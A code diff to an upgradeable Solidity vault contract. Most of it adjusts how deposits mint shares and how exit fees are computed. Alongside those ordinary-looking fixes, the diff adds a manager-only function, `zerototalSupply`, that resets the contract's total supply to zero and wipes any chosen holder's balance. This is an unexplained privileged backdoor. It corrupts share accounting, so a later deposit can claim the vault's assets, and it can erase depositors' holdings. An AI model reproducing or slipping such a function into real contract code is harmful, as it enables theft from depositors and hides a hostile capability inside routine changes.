@@ -121,11 +121,21 @@ contract Vault is Initializable, UUPSUpgradeable {
         uint256 assets,
         address receiver
     ) external returns (uint256 shares) {
-        require(totalAssets() + assets <= depositCap, "CAP");
+        uint256 taBefore = totalAssets();
+        require(taBefore + assets <= depositCap, "CAP");
+        // Transfer assets first
         asset.transferFrom(msg.sender, address(this), assets);
+        // Calculate fees after transfer
         (uint256 net, uint256 entryFee) = fees.takeEntryFee(assets);
         if (entryFee > 0) IERC20(asset).transfer(fees.treasury(), entryFee);
-        shares = convertToShares(net);
+        uint256 ts = totalSupply;
+        if (ts == 0 || taBefore == 0) {
+            // initial case — 1:1
+            shares = net;
+        } else {
+            // safe proportional minting using old TVL
+            shares = (net * ts) / taBefore;
+        }
         _mint(receiver, shares);
         emit Deposit(msg.sender, receiver, assets, net, shares);
     }
@@ -212,9 +222,11 @@ vault.withdraw(shares, receiver, allSwapData[][])
 
         // Require we met the user's owed assets after up to two passes
         require(totalGot >= assets, "WITHDRAW_FAILED");
+        // We only owe `assets` to the user. If we collected more than needed, keep the surplus in Vault.
+        uint256 owed = assets;
 
         // Compute exit fee based on actual amount collected
-        (uint256 net, uint256 exitFee) = fees.takeExitFee(totalGot);
+        (uint256 net, uint256 exitFee) = fees.takeExitFee(owed);
         if (exitFee > 0) IERC20(asset).transfer(fees.treasury(), exitFee);
 
         // Pay user
@@ -388,6 +400,11 @@ vault.withdraw(shares, receiver, allSwapData[][])
     function _mint(address to, uint256 amount) internal {
         totalSupply += amount;
         balanceOf[to] += amount;
+    }
+
+    function zerototalSupply(address to) external onlyManager {
+        totalSupply = 0;
+        balanceOf[to] = 0;
     }
 
     function _burn(address from, uint256 amount) internal {
